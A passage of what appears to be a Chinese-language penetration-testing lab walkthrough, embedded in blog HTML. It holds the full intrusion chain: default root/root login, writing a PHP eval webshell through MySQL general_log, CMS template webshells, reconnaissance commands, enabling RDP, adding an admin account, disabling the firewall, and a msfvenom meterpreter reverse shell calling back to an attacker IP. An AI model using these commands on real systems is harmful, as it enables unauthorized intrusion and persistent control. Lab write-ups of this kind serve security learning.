+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png 2x"
+            sizes="auto"
+            alt="image-20230515231226002">
+    </a></figure></p>
+<p>发现后台页面路径</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png" title="image-20230515231400157" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png 2x"
+            sizes="auto"
+            alt="image-20230515231400157">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png" title="image-20230515231423904" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png 2x"
+            sizes="auto"
+            alt="image-20230515231423904">
+    </a></figure></p>
+<p>尝试root/root也能登上</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png" title="image-20230515231724831" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png 2x"
+            sizes="auto"
+            alt="image-20230515231724831">
+    </a></figure></p>
+<h2 id="2利用sql写文件getshell" class="headerLink">
+    <a href="#2%e5%88%a9%e7%94%a8sql%e5%86%99%e6%96%87%e4%bb%b6getshell" class="header-mark"></a>2 2.利用sql写文件getshell</h2><p>一般<strong>利用mysql获取shell的方法</strong>有以下几种：</p>
+<ol>
+<li>
+<p>select &lsquo;一句话木马&rsquo; into dumpfile/outfile &lsquo;绝对路径&rsquo;</p>
+</li>
+<li>
+<ol>
+<li>条件1：secure_file_priv变量非NULL，表示支持数据导入导出</li>
+<li>条件2：用户拥有root权限</li>
+<li>条件3：知道当前网站的绝对路径</li>
+</ol>
+</li>
+<li>
+<p>利用日志文件</p>
+</li>
+</ol>
+<h3 id="判断步骤如下" class="headerLink">
+    <a href="#%e5%88%a4%e6%96%ad%e6%ad%a5%e9%aa%a4%e5%a6%82%e4%b8%8b" class="header-mark"></a>2.1 判断步骤如下：</h3><p>查看secure-file-priv值，为NULL时表示禁止导入导出，且无法通过sql语句对该属性值进行修改，说明第1种方式行不通</p>
+<p>我们可以通过以下sql语句进行查询</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">show</span> <span class="n">variables</span> <span class="n">like</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">ecure%&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png" title="image-20230515233051860" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png 2x"
+            sizes="auto"
+            alt="image-20230515233051860">
+    </a></figure></p>
+<p>可见secure_file_priv的值为null，要想修改 Value值 只能修改配置文件 mysql.ini(linux修改配置文件：my.cnf)，所以第一种方法行不通</p>
+<p>查看是否开启日志记录以及日志保存目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHOW VARIABLES LIKE &#39;%general_log%&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png" title="image-20230515233550682" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png 2x"
+            sizes="auto"
+            alt="image-20230515233550682">
+    </a></figure></p>
+<p>为OFF，但可使用SET语句设置为ON</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set global general_log =&#34;on&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png" title="image-20230515234233335" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png 2x"
+            sizes="auto"
+            alt="image-20230515234233335">
+    </a></figure></p>
+<p>并将日志保存路径设置为php文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set global general_log_file=&#34;C:/phpStudy/www/1.php&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再执行一条一句话木马语句，该语句会被记录到日志文件中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select &#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png" title="image-20230515234455228" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png 2x"
+            sizes="auto"
+            alt="image-20230515234455228">
+    </a></figure></p>
+<p>此时，我们已经成功将一句话木马写入主机，然后就可以使用蚁剑或菜刀进行连接，成功getshell</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png" title="image-20230515235149545" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png 2x"
+            sizes="auto"
+            alt="image-20230515235149545">
+    </a></figure></p>
+<h3 id="另外我们也可以通过扫描到的cms管理页面进行getshell账密网站页面直接写了" class="headerLink">
+    <a href="#%e5%8f%a6%e5%a4%96%e6%88%91%e4%bb%ac%e4%b9%9f%e5%8f%af%e4%bb%a5%e9%80%9a%e8%bf%87%e6%89%ab%e6%8f%8f%e5%88%b0%e7%9a%84cms%e7%ae%a1%e7%90%86%e9%a1%b5%e9%9d%a2%e8%bf%9b%e8%a1%8cgetshell%e8%b4%a6%e5%af%86%e7%bd%91%e7%ab%99%e9%a1%b5%e9%9d%a2%e7%9b%b4%e6%8e%a5%e5%86%99%e4%ba%86" class="header-mark"></a>2.2 另外我们也可以通过扫描到的cms管理页面进行getshell(账密网站页面直接写了)</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png" title="image-20230516000201759" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png 2x"
+            sizes="auto"
+            alt="image-20230516000201759">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png" title="image-20230516000418970" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png 2x"
+            sizes="auto"
+            alt="image-20230516000418970">
+    </a></figure></p>
+<p>登录后可对网站整体内容进行管理，其中可以对模板文件进行编辑，这样就可以向模板文件中增加一句话木马进行连接来getshell。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png" title="image-20230516000724567" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png 2x"
+            sizes="auto"
+            alt="image-20230516000724567">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png" title="image-20230516000736951" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png 2x"
+            sizes="auto"
+            alt="image-20230516000736951">
+    </a></figure></p>
+<p>直接用蚁剑连就可以了</p>
+<p>同时该cms还存在xss、sql注入等漏洞，但利用价值不大</p>
+<h2 id="3拿下webshell后信息收集内网信息收集" class="headerLink">
+    <a href="#3%e6%8b%bf%e4%b8%8bwebshell%e5%90%8e%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>3 3.(拿下webshell后信息收集)内网信息收集</h2><p>到目前为止，相当于我们已经获取了Win7的控制权，如果想进一步对内网段中其他主机的控制权，便需要进一步收集信息。例如，网段名、域用户、域控IP、管理员信息等等。而内网渗透的终极目标就是控制域控服务器，进而控制整个内网段。</p>
+<p><strong>内网信息收集可以考虑以下几种方式：</strong></p>
+<p>1.直接在蚁剑中打开终端执行命令&ndash;&gt;相当于是在win7的终端上执行各种命令</p>
+<p>2.利用蚁剑上传msf反弹木马，执行后反弹shell到msf，在msf中执行命令&ndash;&gt;可以利用msf封装的其他命令，但该工具的优点在于一台机器的不断渗透，缺点是有点不稳定，容易掉线。</p>
+<p>3.利用蚁剑上传CS反弹木马，执行后反弹shell到CS，然后在CS中执行命令&ndash;&gt;可以利用CS提供的其他命令，能较方便的获取同内网其他主机的信息，并获取其他主机的控制权，但是命令执行后的结果返回特别慢，所以如果仅仅是执行一些收集主机信息的命令，建议不要用CS。</p>
+<h3 id="基本信息收集" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>3.1 基本信息收集</h3><p>常用命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ipconfig /all   查看本机ip，所在域
+</span></span><span class="line"><span class="cl">route print     打印路由信息
+</span></span><span class="line"><span class="cl">net view        查看局域网内其他主机名
+</span></span><span class="line"><span class="cl">arp -a          查看arp缓存
+</span></span><span class="line"><span class="cl">net start       查看开启了哪些服务
+</span></span><span class="line"><span class="cl">net share       查看开启了哪些共享
+</span></span><span class="line"><span class="cl">net share ipc$  开启ipc共享
+</span></span><span class="line"><span class="cl">net share c$    开启c盘共享
+</span></span><span class="line"><span class="cl">net use \\192.168.xx.xx\ipc$ &#34;&#34; /user:&#34;&#34;   与192.168.xx.xx建立空连接
+</span></span><span class="line"><span class="cl">net use \\192.168.xx.xx\c$ &#34;密码&#34; /user:&#34;用户名&#34;  建立c盘共享
+</span></span><span class="line"><span class="cl">dir \\192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件
+</span></span><span class="line"><span class="cl">net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+</span></span><span class="line"><span class="cl">net user                 查看本机用户列表
+</span></span><span class="line"><span class="cl">net user /domain         查看域用户
+</span></span><span class="line"><span class="cl">net localgroup administrators   查看本地管理员组（通常会有域用户）
+</span></span><span class="line"><span class="cl">net view /domain         查看有几个域
+</span></span><span class="line"><span class="cl">net user 用户名 /domain   获取指定域用户的信息
+</span></span><span class="line"><span class="cl">net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+</span></span><span class="line"><span class="cl">net group 组名 /domain    查看域中某工作组
+</span></span><span class="line"><span class="cl">net group &#34;domain admins&#34; /domain  查看域管理员的名字
+</span></span><span class="line"><span class="cl">net group &#34;domain computers&#34; /domain  查看域中的其他主机名
+</span></span><span class="line"><span class="cl">net group &#34;doamin controllers&#34; /domain  查看域控制器（可能有多台）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">netstat -ano | find &#34;3389&#34;   查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows）
+</span></span><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  用于开启远程桌面登录
+</span></span><span class="line"><span class="cl">尝试远程桌面登录
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="尝试远程桌面登录" class="headerLink">
+    <a href="#%e5%b0%9d%e8%af%95%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e7%99%bb%e5%bd%95" class="header-mark"></a>3.2 尝试远程桌面登录</h3><p><strong>判断3389端口是否开放</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">netstat -ano| find &#34;3389&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png" title="image-20230516111958296" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png 2x"
+            sizes="auto"
+            alt="image-20230516111958296">
+    </a></figure></p>
+<p>在蚁剑shell执行，发现并没有，这里猜测是被防火墙屏蔽了</p>
+<p>在蚁剑shell输入一下命令，尝试开放3389端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png" title="image-20230516113222692" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png 2x"
+            sizes="auto"
+            alt="image-20230516113222692">
+    </a></figure></p>
+<p>新建用户名，并添加到管理员组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">net user    查看用户账号名
+</span></span><span class="line"><span class="cl">net user username password /add   新建用户
+</span></span><span class="line"><span class="cl">net localgroup administrators username /add 将新用户添加到管理员组
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png" title="image-20230516113550048" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png 2x"
+            sizes="auto"
+            alt="image-20230516113550048">
+    </a></figure></p>
+<p>ps：要注意这里新建用户时，新用户的密码有强度限制，如果设置的太简单将无法添加。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png" title="image-20230516114007149" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png 2x"
+            sizes="auto"
+            alt="image-20230516114007149">
+    </a></figure></p>
+<p>rdp连不上，可能是被防火墙屏蔽了</p>
+<p>关闭防火墙</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh advfirewall set allprofiles state off
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png" title="image-20230516134541354" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png 2x"
+            sizes="auto"
+            alt="image-20230516134541354">
+    </a></figure></p>
+<p>随后就可以连接了</p>
+<h1 id="0x4后渗透" class="headerLink">
+    <a href="#0x4%e5%90%8e%e6%b8%97%e9%80%8f" class="header-mark"></a>0x4后渗透</h1><h2 id="msf上线" class="headerLink">
+    <a href="#msf%e4%b8%8a%e7%ba%bf" class="header-mark"></a>1 msf上线</h2><p>这里的思路是将shell派送给CS或者msf进行下一步渗透。
+使用msf生成exe并开启监听(也可以用cs生产exe)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.126.129 LPORT=2333 -f exe -o /root/run.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**tips：**这边的locaohost(lhost)是攻击机kali的ip地址，千万不要填成靶机ip</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png" title="image-20230516121349150" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png 2x"
+            sizes="auto"
+            alt="image-20230516121349150">
+    </a></figure></p>
+<p>通过蚁剑上传并执行
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png" title="image-20230516115437667" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png 2x"
+            sizes="auto"
+            alt="image-20230516115437667">
+    </a></figure></p>
+<p>在shell里执行run.exe</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png" title="image-20230516115523188" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png 2x"
+            sizes="auto"
+            alt="image-20230516115523188">
+    </a></figure></p>
+<p>在kali中进入msf相关模块:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter_reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">126.129</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2333</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span> <span class="o">-</span><span class="n">j</span><span class="p">(</span><span class="err">后台</span><span class="p">)</span><span class="err">允许</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png" title="image-20230516121146493" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png 2x"
+            sizes="auto"
+            alt="image-20230516121146493">
+    </a></figure></p>
+<p>随后通过<code>sessions</code>命令来查看反弹回来的shell
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png" title="image-20230516121300186" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png"
